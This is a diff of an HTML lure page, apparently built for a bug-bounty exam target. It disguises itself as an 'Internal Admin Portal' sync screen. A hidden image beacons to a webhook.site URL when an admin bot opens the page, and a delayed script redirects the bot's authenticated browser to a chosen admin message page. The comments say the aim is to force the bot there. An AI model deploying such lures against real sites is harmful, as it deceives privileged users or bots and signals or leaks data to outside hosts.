@@ -1,12 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Internal Admin Portal</title>
+</head>
 <body>
+    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
+        <h1>Synchronizing with Admin Dashboard...</h1>
+        <p>Please do not close this window. Redirecting to message ID: <strong>69e76aedbee6d6b7c6641e7e</strong></p>
+    </div>
+
+    <img src="https://webhook.site/4f76b790-cb50-4939-8cc1-b60d30b71915?status=trigger_opened" style="display:none">
+
     <script>
-        // UPDATE THIS ID with the one you just got from the API
-        const messageId = "69e76aedbee6d6b7c6641e7e"; 
-        
-        // Force the bot to go to the message detail page
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
+        // The ID from your latest POST request
+        const messageId = "69e76aedbee6d6b7c6641e7e";
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
+
+        // We use a 3-second delay to ensure the admin bot's browser 
+        // fully authenticates and loads the target page content.
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 3000);
     </script>
 </body>
 </html>
